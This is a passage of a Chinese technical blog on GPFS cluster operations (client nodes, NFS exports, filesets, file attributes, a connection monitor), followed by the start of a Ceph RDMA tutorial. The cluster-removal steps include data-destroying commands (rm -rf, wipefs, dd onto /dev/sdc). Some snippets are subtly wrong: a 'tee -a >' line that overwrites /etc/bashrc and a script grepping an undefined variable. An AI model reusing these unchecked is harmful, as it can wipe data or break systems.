ff:ff:ff:ff:ff:ff<br>    inet 10.10.0.3/24 brd 10.10.0.255 scope global noprefixroute ens0<br>       valid_lft forever preferred_lft forever<br>    inet 10.10.0.103/24 scope global secondary ens0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::250:56ff:fe85:fb43/64 scope <span class="hljs-built_in">link</span> noprefixroute<br>       valid_lft forever preferred_lft forever<br><br><br>[root@node02 data]# mmlscluster --ces<br>GPFS cluster information<br>========================<br>  GPFS cluster name:         gpfscluster.node01<br>  GPFS cluster <span class="hljs-built_in">id</span>:           12883004940134699797<br><br>Cluster Export Services global parameters<br>-----------------------------------------<br>  Shared root directory:                /gpfsdata<br>  Enabled Services:                     None<br>  Log level:                            0<br>  Address distribution policy:          even-coverage<br><br>Node   Daemon node name            IP address       CES IP address list<br>-----------------------------------------------------------------------<br>   2   node02                      10.10.0.2        10.10.0.102<br>   3   node03                      10.10.0.3        10.10.0.103<br><br><br>[root@node02 data]# mmces service <span class="hljs-built_in">enable</span> nfs<br>mmchconfig: Command successfully completed<br>mmchconfig: Propagating the cluster configuration data to all<br>  affected nodes.  This is an asynchronous process.<br>node02:  NFS: service already running.<br>node03:  NFS: service already running.<br></code></pre></td></tr></table></figure><h1 id="四、集群运维"><a href="#四、集群运维" class="headerlink" title="四、集群运维"></a>四、集群运维</h1><h2 id="4-1、新增客户端"><a href="#4-1、新增客户端" class="headerlink" title="4.1、新增客户端"></a>4.1、新增客户端</h2><p>在执行以下命令操作前，请确保如下条件满足:</p><ul><li><code>所有 server 节点</code>:<ul><li>&#x2F;etc&#x2F;hosts 文件中已配置新增 client 节点的映射记录；</li><li>可通过 ssh 免密访问 client 节点；</li></ul></li><li><code>新增的 client 节点</code>:<ul><li>&#x2F;etc&#x2F;hosts 文件中已记录所有 server 节点的映射记录；</li><li>本地已存在待安装的 gpfs 软件包；</li></ul></li></ul><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ========== 1. 安装 gpfs 依赖包/软件包 ==========</span><br><br><span class="hljs-comment"># for centos 7/8</span><br>dnf install -y ksh m4 kernel-devel kernel-devel-$(<span class="hljs-built_in">uname</span> -r) kernel-headers gcc-c++ \<br>               python3 net-tools perl-Thread-Queue<br>rpm -ivh --replacepkgs gpfs.base-5.1.8-1.x86_64.rpm<br>rpm -ivh --replacepkgs gpfs.docs-5.1.8-1.noarch.rpm<br>rpm -ivh --replacepkgs gpfs.gpl-5.1.8-1.noarch.rpm<br>rpm -ivh --replacepkgs gpfs.gskit-8.0.55-19.1.x86_64.rpm<br>rpm -ivh --replacepkgs gpfs.gss.pmsensors-5.1.8-1.el8.x86_64.rpm<br>rpm -ivh --replacepkgs gpfs.license.da-5.1.8-1.x86_64.rpm<br>rpm -ivh --replacepkgs gpfs.msg.en_US-5.1.8-1.noarch.rpm<br><br><span class="hljs-comment"># for ubuntu 20/22</span><br>apt-get install -y make cpp gcc g++ binutils ksh m4 linux-kernel-headers libaio1 \<br>                   selinux-utils binfmt-support libssl-dev gawk libsasl2-dev<br>dpkg -i gpfs.afm.cos_1.0.0-10.1_amd64.deb<br>dpkg -i gpfs.base_5.1.8-1_amd64.deb<br>dpkg -i gpfs.compression_5.1.8-1_amd64.deb<br>dpkg -i gpfs.docs_5.1.8-1_all.deb<br>dpkg -i gpfs.gpl_5.1.8-1_all.deb<br>dpkg -i gpfs.gskit_8.0.55-19.1_amd64.deb<br>dpkg -i gpfs.java_5.1.8-1_amd64.deb<br>dpkg -i gpfs.license.da_5.1.8-1_amd64.deb<br>dpkg -i gpfs.msg.en-us_5.1.8-1_all.deb<br><br><span class="hljs-comment"># for ubuntu 20</span><br>dpkg -i gpfs.gss.pmsensors_5.1.8-1.U20.04_amd64.deb<br>dpkg -i gpfs.librdkafka_5.1.8-1.U20.04_amd64.deb<br><br><span class="hljs-comment"># for ubuntu 22</span><br>dpkg -i gpfs.gss.pmsensors_5.1.8-1.U22.04_amd64.deb<br>dpkg -i gpfs.librdkafka_5.1.8-1.U22.04_amd64.deb<br><br><span class="hljs-comment"># 配置 bin 路径</span><br><br><span class="hljs-comment"># for centos 7/8</span><br>/etc/bashrc<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export PATH=\$PATH:/usr/lpp/mmfs/bin&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> -a &gt; /etc/bashrc<br><br><span class="hljs-comment"># for ubuntu 20/22</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export PATH=\$PATH:/usr/lpp/mmfs/bin&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> -a &gt; /etc/bash.bashrc<br><br><br><br><span class="hljs-comment"># ========== 2. 构建并添加客户端节点 ==========</span><br><br><span class="hljs-comment"># 构建可移植层软件（在 client 节点上执行）</span><br>mmbuildgpl<br><br><span class="hljs-comment"># 添加新 client 节点（在 server 节点上执行）</span><br>mmaddnode -N client01<br><br><span class="hljs-comment"># 调整节点许可证（在 server 节点上执行）</span><br>mmchlicense client -N client01<br><br><span class="hljs-comment"># 修改 client 节点配置（在 server 节点上执行）</span><br>mmchconfig <span class="hljs-built_in">autoload</span>=<span class="hljs-built_in">yes</span>,verbsRdma=<span class="hljs-built_in">disable</span> -N client01<br><br><span class="hljs-comment"># 启动 client 节点（在 client 节点上执行）</span><br>mmstartup<br><br><span class="hljs-comment"># 查看节点挂载</span><br><span class="hljs-built_in">df</span> -h<br><br><span class="hljs-comment"># 设置传感器节点（在 server 节点上执行）</span><br>mmchnode --perfmon -N client01<br></code></pre></td></tr></table></figure><h2 id="4-2、GUI运维操作"><a href="#4-2、GUI运维操作" class="headerlink" title="4.2、GUI运维操作"></a>4.2、GUI运维操作</h2><h3 id="4-2-1、命令操作"><a href="#4-2-1、命令操作" class="headerlink" title="4.2.1、命令操作"></a>4.2.1、命令操作</h3><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ========== gui 配置变更 ==========</span><br><span class="hljs-comment"># 仅需在任意 server 节点上执行</span><br><br><span class="hljs-comment"># 设置容量监控节点和间隔</span><br>mmperfmon config update GPFSDiskCap.restrict=[node] GPFSDiskCap.period=86400<br><br><span class="hljs-comment"># 设置 fileset 容量监控节点和间隔</span><br>mmperfmon config update GPFSFilesetQuota.restrict=[node] GPFSFilesetQuota.period=3600<br><br><span class="hljs-comment"># ========== 移除 gui 组件 ==========</span><br><span class="hljs-comment"># 仅需在任意 server 节点上执行</span><br><br><span class="hljs-comment"># 停止 gui 节点服务</span><br>systemctl stop gpfsgui<br>systemctl <span class="hljs-built_in">disable</span> gpfsgui<br><br><span class="hljs-comment"># 获取传感器节点列表</span><br>mmlscluster | grep perfmon<br><br><span class="hljs-comment"># 移除传感器节点</span><br>mmchnode --noperfmon -N node01,node02,node03<br></code></pre></td></tr></table></figure><h3 id="4-2-2、API操作"><a href="#4-2-2、API操作" class="headerlink" title="4.2.2、API操作"></a>4.2.2、API操作</h3><p>GPFS GUI 提供了 API 服务，用于获取集群变更，变更集群配置等。</p><p><strong>相关API:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 获取 gpfs gui api 列表</span><br>curl -k -u <span class="hljs-string">&quot;admin:password&quot;</span> -X GET \<br>    --header <span class="hljs-string">&quot;accept:application/json&quot;</span> \<br>    <span class="hljs-string">&quot;https://10.10.0.1:443/scalemgmt/v2/info&quot;</span><br></code></pre></td></tr></table></figure><h2 id="4-3、移除集群"><a href="#4-3、移除集群" class="headerlink" title="4.3、移除集群"></a>4.3、移除集群</h2><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ========== 移除集群 ==========</span><br><span class="hljs-comment"># 需要在所有 server 节点上执行，执行前需确保已移除所有客户端节点</span><br><br><span class="hljs-comment"># 停止所有 server 节点</span><br>mmshutdown<br><br><span class="hljs-comment"># 卸载软件</span><br>dnf remove -y <span class="hljs-string">&quot;gpfs*&quot;</span><br><br><span class="hljs-comment"># 移除 gpfs 相关的 fstab 开机挂载</span><br><span class="hljs-built_in">cat</span> /etc/fstab<br>vi /etc/fstab<br><br><span class="hljs-comment"># 移除 gpfs 相关的文件</span><br>ll /etc/systemd/system<br>ll /etc/systemd/system/multi-user.target.wants<br><span class="hljs-built_in">rm</span> -rf /etc/systemd/system/gpfscsi-wr.service<br><span class="hljs-built_in">rm</span> -rf /etc/systemd/system/multi-user.target.wants/gpfscsi-wr.service<br><span class="hljs-built_in">rm</span> -rf /usr/lpp/mmfs<br><span class="hljs-built_in">rm</span> -rf /var/mmfs<br><br><span class="hljs-comment"># 清除 gpfs nsd 相关硬盘数据（每块盘都需要执行，避免下次再次部署时新增 nsd 组件出错）</span><br>fdisk /dev/sdc<br>wipefs -a /dev/sdc<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/dev/sdc bs=1M count=100<br></code></pre></td></tr></table></figure><h2 id="4-4、CES运维"><a href="#4-4、CES运维" class="headerlink" title="4.4、CES运维"></a>4.4、CES运维</h2><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 新增 nfs export</span><br><span class="hljs-built_in">mkdir</span> -p /gpfsdata/nfsexport01<br>mmnfs <span class="hljs-built_in">export</span> add /gpfsdata/nfsexport01 --client <span class="hljs-string">&quot;10.10.0.1(Access_Type=RW,Squash=no_root_squash)&quot;</span><br><br><span class="hljs-comment"># 移除 nfs export</span><br>mmnfs <span class="hljs-built_in">export</span> remove /gpfsdata/nfsexport01<br><br><span class="hljs-comment"># 新增 nfs export client</span><br>mmnfs <span class="hljs-built_in">export</span> change /gpfsdata/nfsexport01 --nfsadd <span class="hljs-string">&quot;10.10.0.5(Access_Type=RO,Squash=no_root_squash)&quot;</span> --nfsposition 0<br><br><span class="hljs-comment"># 修改 nfs export client</span><br>mmnfs <span class="hljs-built_in">export</span> change /gpfsdata/nfsexport01 --nfschange <span class="hljs-string">&quot;10.10.0.5(Access_Type=RW,Squash=no_root_squash)&quot;</span> --nfsposition 0<br><br><span class="hljs-comment"># 移除 nfs export client</span><br>mmnfs <span class="hljs-built_in">export</span> change /gpfsdata/nfsexport01 --nfsremove 10.10.0.5<br></code></pre></td></tr></table></figure><h2 id="4-5、配置变更"><a href="#4-5、配置变更" class="headerlink" title="4.5、配置变更"></a>4.5、配置变更</h2><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 指定配额命令是否忽略数据复制因子。有效值为 yes/no 。默认值为 no。</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># 该值为 no : 两副本集群中设置 quota 为 100GB ，实际可用为 50GB ；</span><br><span class="hljs-comment"># 该值为 yes : 两副本集群中设置 quota 为 100GB ，实际可用为 100GB ；</span><br>mmchconfig ignoreReplicationForQuota=<span class="hljs-built_in">yes</span><br><br><br><span class="hljs-comment"># 指定GPFS 文件系统上的df命令输出是否忽略数据复制因子。有效值为 yes/no 。默认值为no。</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># 该值为 no : 两副本集群中，实际存储文件大小为 100GB ，通过 df 显示为 200GB ；</span><br><span class="hljs-comment"># 该值为 yes : 两副本集群中，实际存储文件大小为 100GB ， 通过 df 显示为 100GB ；</span><br>mmchconfig ignoreReplicationOnStatfs=<span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure><h2 id="4-6、Fileset运维"><a href="#4-6、Fileset运维" class="headerlink" title="4.6、Fileset运维"></a>4.6、Fileset运维</h2><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 新增 fileset</span><br>mmcrfileset defaultfs fileset01<br><br><span class="hljs-comment"># 删除 fileset</span><br>mmdelfileset defaultfs fileset01<br><br><span class="hljs-comment"># 查看 fileset link path</span><br><span class="hljs-comment"># 输出信息每列自动对齐</span><br>mmlsfileset defaultfs | column -t<br><br><span class="hljs-comment"># 创建 fileset link path</span><br>mmlinkfileset defaultfs fileset01 -J /gpfsdata/fileset01<br><br><span class="hljs-comment"># 删除 fileset link path</span><br>mmunlinkfileset defaultfs fileset01<br><br><span class="hljs-comment"># 查看 fileset quota</span><br><span class="hljs-comment"># 输出信息每列自动对齐</span><br>mmrepquota -j defaultfs | column -t<br><br><span class="hljs-comment"># 设置 fileset quota 块大小</span><br><span class="hljs-comment"># soft limit 为 90G ， hard limit 为 100G</span><br>mmsetquota defaultfs:fileset01 --block 90G:100G<br><br><span class="hljs-comment"># 设置 fileset quota 文件数量</span><br><span class="hljs-comment"># soft limit 为 9000 ， hard limit 为 10000</span><br>mmsetquota defaultfs:fileset01 --files 9000:10000<br></code></pre></td></tr></table></figure><h2 id="4-7、文件-目录属性"><a href="#4-7、文件-目录属性" class="headerlink" title="4.7、文件&#x2F;目录属性"></a>4.7、文件&#x2F;目录属性</h2><blockquote><p><strong>注意:</strong> 如果客户端机器上启动了 <code>selinux</code> ，那么当客户端挂载存储时可能会导致 <code>mount | grep gpfs</code> 中存在 <code>seclabel</code> 参数，这可能会导致在启用了 <code>appendonly</code> 的目录中执行 <code>mkdir、cp</code> 等命令时报错 <code>Read-only file system</code> ，从而导致操作结果不明确。比如执行 <code>mkdir</code> 已经成功了，但是仍会报错 <code>Read-only file system</code> ； 比如执行 <code>cp -R</code> 操作失败，但是也已经往目标路径中传输了部分数据等。</p></blockquote><p><strong>属性说明:</strong></p><ul><li><code>appendonly</code> :<ul><li>对目录设置后，该目录中可新建文件&#x2F;目录，该目录不可删除，不可重命名。且该目录下的子目录和子文件将继承父目录的属性。</li><li>对文件设置后，该文件只可追加写，不可删除，不可重命名。</li></ul></li><li><code>immutable</code> : <ul><li>对目录设置后，该目录中无法创建任何文件&#x2F;目录，该目录不可删除，不可重命名。所有会导致数据变更的操作均会报错: <code>Read-only file system</code> 。<ul><li>当该目录中之前存在文件&#x2F;目录，且当仅对该目录启用 immutable 属性后，该目录下的子文件和子目录不可以被删除，重命名等，但是其子目录中仍然可以创建删除文件目录等操作。</li></ul></li><li>对文件设置后，该文件内容不可修改，不可删除，不可重命名。所有会导致数据变更的操作均会报错: <code>Read-only file system</code> 。</li></ul></li></ul><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看文件属性</span><br><span class="hljs-built_in">touch</span> /gpfsdata/testfile<br>mmlsattr -L /gpfsdata/testfile<br><br><span class="hljs-comment"># 文件属性启用 immutable</span><br>mmchattr -i <span class="hljs-built_in">yes</span> /gpfsdata/testfile<br><br><span class="hljs-comment"># 文件属性关闭 immutable</span><br>mmchattr -i no /gpfsdata/testfile<br><br><span class="hljs-comment"># 文件属性启用 appendonly</span><br>mmchattr -a <span class="hljs-built_in">yes</span> /gpfsdata/testfile<br><br><span class="hljs-comment"># 文件属性关闭 appendonly</span><br>mmchattr -a no /gpfsdata/testfile<br><br><span class="hljs-comment"># 查看目录属性</span><br>mmlsattr -L /gpfsdata<br><br><span class="hljs-comment"># 设置目录及目录下所有文件目录的属性，开启 immutable</span><br><span class="hljs-comment"># 其他属性操作同理</span><br>find /gpfsdata | xargs -n 1 mmchattr -i <span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure><h2 id="4-8、定位-GUI-的连接进程"><a href="#4-8、定位-GUI-的连接进程" class="headerlink" title="4.8、定位 GUI 的连接进程"></a>4.8、定位 GUI 的连接进程</h2><p>某些场景下可能会出现某些服务或者进程配置了错误的 GUI 的账户密码，导致 GUI 认证失败，这通常会触发 GUI 的报警事件，为此我们需要在对应的访问客户端机器上定位异常的服务或进程，则可以是使用下面的脚本:</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># 指定 GUI 的 API 地址</span><br>TARGET_IP=<span class="hljs-string">&quot;10.10.10.1:443&quot;</span><br>LOG_FILE=<span class="hljs-string">&quot;connection_monitor.log&quot;</span><br><br><span class="hljs-comment"># 清空日志文件</span><br>&gt; <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span><br><br><span class="hljs-comment"># 存储已处理的 PID ，避免重复记录</span><br><span class="hljs-built_in">declare</span> -A seen_pids<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始监控连接到 <span class="hljs-variable">$TARGET_IP</span> 的进程...&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;日志文件: <span class="hljs-variable">$LOG_FILE</span>&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r line; <span class="hljs-keyword">do</span><br>        <span class="hljs-comment"># 提取PID</span><br>        <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> =~ pid=([0-9]+) ]]; <span class="hljs-keyword">then</span><br>            <span class="hljs-comment"># 获取连接信息</span><br>            conn_info=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $1, $4, $5&#125;&#x27;</span>)<br>            conn_state=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$conn_info</span>&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br>            local_addr=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$conn_info</span>&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br>            remote_addr=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$conn_info</span>&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span>)<br><br>            <span class="hljs-comment"># 获取进程信息</span><br>            pid_val=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;BASH_REMATCH[1]&#125;</span>&quot;</span><br>            proc_info=$(ps -p <span class="hljs-string">&quot;<span class="hljs-variable">$pid_val</span>&quot;</span> -o pid,cmd --no-headers 2&gt;/dev/null)<br><br>            <span class="hljs-comment"># 获取父进程 ID 和详细信息</span><br>            ppid=$(ps -o ppid= -p <span class="hljs-string">&quot;<span class="hljs-variable">$pid_val</span>&quot;</span> 2&gt;/dev/null | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27; &#x27;</span>)<br>            <span class="hljs-keyword">if</span> [[ -n <span class="hljs-string">&quot;<span class="hljs-variable">$ppid</span>&quot;</span> ]]; <span class="hljs-keyword">then</span><br>                parent_info=$(ps -p <span class="hljs-string">&quot;<span class="hljs-variable">$ppid</span>&quot;</span> -o pid,cmd --no-headers 2&gt;/dev/null)<br>            <span class="hljs-keyword">else</span><br>                parent_info=<span class="hljs-string">&quot;[父进程已退出]&quot;</span><br>            <span class="hljs-keyword">fi</span><br><br>            <span class="hljs-comment"># 记录日志</span><br>            timestamp=$(<span class="hljs-built_in">date</span> +<span class="hljs-string">&quot;%Y-%m-%d %T&quot;</span>)<br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;========================================&quot;</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;时间戳      : <span class="hljs-variable">$timestamp</span>&quot;</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;连接信息    : <span class="hljs-variable">$local_addr</span> -&gt; <span class="hljs-variable">$remote_addr</span>&quot;</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;连接状态    : <span class="hljs-variable">$conn_state</span>&quot;</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进程PID     : <span class="hljs-variable">$pid_val</span>&quot;</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;进程命令    : <span class="hljs-variable">$&#123;proc_info:-[进程已退出]&#125;</span>&quot;</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;父进程PID   : <span class="hljs-variable">$&#123;ppid:-N/A&#125;</span>&quot;</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;父进程命令  : <span class="hljs-variable">$&#123;parent_info:-N/A&#125;</span>&quot;</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-comment"># 使用 ss 获取所有TCP连接</span><br>    <span class="hljs-keyword">done</span> &lt; &lt;(ss -ntp | grep -v <span class="hljs-string">&quot;State&quot;</span> | grep <span class="hljs-string">&quot;<span class="hljs-variable">$TARGET</span>&quot;</span>)<br><br>    <span class="hljs-comment"># 每秒检查一次</span><br>    <span class="hljs-built_in">sleep</span> 1<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h1 id="五、参考资料"><a href="#五、参考资料" class="headerlink" title="五、参考资料"></a>五、参考资料</h1><ul><li>GPFS安装搭建: <a href="https://www.jianshu.com/p/a0ecc0838b3b?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation">https://www.jianshu.com/p/a0ecc0838b3b?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a></li><li>IBM Storage Scale Doc: <a href="https://www.ibm.com/docs/en/storage-scale/5.1.8">https://www.ibm.com/docs/en/storage-scale/5.1.8</a></li><li>GPFS 分布式文件系统在云计算环境中的实践: <a href="https://www.sohu.com/a/213249408_151779">https://www.sohu.com/a/213249408_151779</a></li><li>GPFS 文件系统部署步骤: <a href="https://www.cnblogs.com/despotic/p/17304002.html">https://www.cnblogs.com/despotic/p/17304002.html</a></li><li>安装 GPFS 管理GUI: <a href="https://www.yaoge123.com/blog/archives/1424">https://www.yaoge123.com/blog/archives/1424</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 分布式存储 </tag>
            
            <tag> GPFS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ceph RDMA 集群部署教程</title>
      <link href="/2024/05/11/ceph-rdma/"/>
      <url>/2024/05/11/ceph-rdma/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Ceph-RDMA-介绍"><a href="#一、Ceph-RDMA-介绍" class="headerlink" title="一、Ceph RDMA 介绍"></a>一、Ceph RDMA 介绍</h1><p>RDMA（Remote Direct Memory Access）是一种远程直接内存访问技术，它允许客户端系统将数据从存储服务器的内存直接复制到该客户端自己的内存中。这种内存直通技术可以提升存储带宽，降低访问时延，同时还可以减少客户端和存储的 CPU 负载。</p><p>按照 Ceph 文档给出的介绍，目前虽然 Ceph 已经支持 RDMA 功能，但是除了其功能可能处于实验阶段，并且支持的能力可能受限，<a href="https://docs.ceph.com/en/latest/rados/configuration/network-config-ref/#confval-ms_type">参考文档</a> 。所以我的意见是并不建议在生产环境中使用。</p><h2 id="1-2、RDMA-环境初始化"><a href="#1-2、RDMA-环境初始化" class="headerlink" title="1.2、RDMA 环境初始化"></a>1.2、RDMA 环境初始化</h2><p>以下测试工具均基于 CentOS 8.5.2111 进行测试，不同系统类型版本对应的软件包及命令可能存在差异。</p><p><strong>查看 RDMA 硬件及驱动信息:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># RDMA 相关软件</span><br>dnf install -y infiniband-diags rdma-core rdma-core-devel perftest \<br>               librdmacm librdmacm-utils libibverbs libibverbs-utils iproute<br><br><span class="hljs-comment"># 查看 ib 网卡信息</span><br><span class="hljs-comment"># 来自软件包 infiniband-diags</span><br>ibstatus<br>ibstat<br><br><span class="hljs-comment"># 查看本机 ib 设备</span><br><span class="hljs-comment"># 来自软件包 libibverbs-utils</span><br>ibv_devices<br>ibv_devinfo<br><br><span class="hljs-comment"># 查看网卡信息</span><br>lspci | grep Mellanox<br><br><span class="hljs-comment"># 查询 ib 网络设备 GID、Port 等信息</span><br><span class="hljs-comment"># 来自 Mellanox 网卡驱动软件包 MLNX_OFED</span><br>show_gids<br><br><span class="hljs-comment"># 查看 rdma 内核模块的状态</span><br><span class="hljs-comment"># 来自 Mellanox 网卡驱动软件包 MLNX_OFED</span><br>/etc/init.d/openibd status<br></code></pre></td></tr></table></figure><p><strong>测试 RDMA 网络:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 带宽测试，工具来自于 perftest</span><br><span class="hljs-comment"># 服务器</span><br>ib_send_bw -a -n 1000000 -c RC -d mlx5_bond_0 -q 10 -i 1<br><span class="hljs-comment"># 客户端</span><br>ib_send_bw -a -n 1000000 -c RC -d mlx5_bond_0 -q 10 -i 1 10.10.10.1<br><br><br><span class="hljs-comment"># 延迟测试，工具来自于 perftest</span><br><span class="hljs-comment"># 服务器</span><br>ib_send_lat -a -d mlx5_bond_0 -F -n 1000 -p 18515<br><span class="hljs-comment"># 客户端</span><br>ib_send_lat -a -d mlx5_bond_0 10.10.10.1 -F -n 1000 -p 18515<br></code></pre></td></tr></table></figure><p><strong>RDMA 流量带宽监测脚本:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>DEVICE=<span class="hljs-string">&quot;mlx5_bond_0&quot;</span>   <span class="hljs-comment"># 替换为你的 RDMA 设备名（通过 `ibstat` 查看）</span><br>PORT=1                 <span class="hljs-comment"># 替换为端口号（通过 `show_gids` 查看）</span><br>INTERVAL=1             <span class="hljs-comment"># 刷新间隔（秒）</span><br><br><span class="hljs-comment"># 初始化计数器</span><br>prev_rcv=$(<span class="hljs-built_in">cat</span> /sys/class/infiniband/<span class="hljs-variable">$DEVICE</span>/ports/<span class="hljs-variable">$PORT</span>/counters/port_rcv_data)<br>prev_xmit=$(<span class="hljs-built_in">cat</span> /sys/class/infiniband/<span class="hljs-variable">$DEVICE</span>/ports/<span class="hljs-variable">$PORT</span>/counters/port_xmit_data)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">sleep</span> <span class="hljs-variable">$INTERVAL</span><br>  <span class="hljs-comment"># 读取当前计数器</span><br>  curr_rcv=$(<span class="hljs-built_in">cat</span> /sys/class/infiniband/<span class="hljs-variable">$DEVICE</span>/ports/<span class="hljs-variable">$PORT</span>/counters/port_rcv_data)<br>  curr_xmit=$(<span class="hljs-built_in">cat</span> /sys/class/infiniband/<span class="hljs-variable">$DEVICE</span>/ports/<span class="hljs-variable">$PORT</span>/counters/port_xmit_data)<br><br>  <span class="hljs-comment"># 计算差值并转换为速率（单位：MB/s）</span><br>  <span class="hljs-comment"># RDMA 计数器单位为 4 字节</span><br>  rcv_bytes=$(( (curr_rcv - prev_rcv) * <span class="hljs-number">4</span> ))<br>  xmit_bytes=$(( (curr_xmit - prev_xmit) * <span class="hljs-number">4</span> ))<br>  <span class="hljs-comment"># 转换为 MB/s</span><br>  rcv_rate=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;scale=2; <span class="hljs-variable">$rcv_bytes</span> / <span class="hljs-variable">$INTERVAL</span> / 1000000&quot;</span> | bc)<br>  xmit_rate=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;scale=2; <span class="hljs-variable">$xmit_bytes</span> / <span class="hljs-variable">$INTERVAL</span> / 1000000&quot;</span> | bc)<br><br>  <span class="hljs-comment"># 输出结果</span><br>  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;RX: <span class="hljs-variable">$&#123;rcv_rate&#125;</span> MB/s \t TX: <span class="hljs-variable">$&#123;xmit_rate&#125;</span> MB/s&quot;</span><br><br>  <span class="hljs-comment"># 更新计数器</span><br>  prev_rcv=<span class="hljs-variable">$curr_rcv</span><br>  prev_xmit=<span class="hljs-variable">$curr_xmit</span><br><span class="hljs-keyword">done</span><br><br><br><br></code></pre></td></tr></table></figure><h1 id="二、使用-ceph-ansible-部署"><a href="#二、使用-ceph-ansible-部署" class="headerlink" title="二、使用 ceph-ansible 部署"></a>二、使用 ceph-ansible 部署</h1><blockquote><p><strong>注意:</strong> 本次部署出现了很多问题，最终并没有成功部署至可使用的状态。但是本文总结了一些部署过程及过程中需要注释的事项，供读者参考。</p></blockquote><p>本次测试环境的机器系统为 CentOS 8.5.2111 ，使用 <a href="https://github.com/ceph/ceph-ansible/tree/stable-6.0">ceph-ansible&#x2F;stable-6.0</a> 来部署 <a href="https://github.com/ceph/ceph/tree/v16.2.15">Ceph v16.2.15</a> 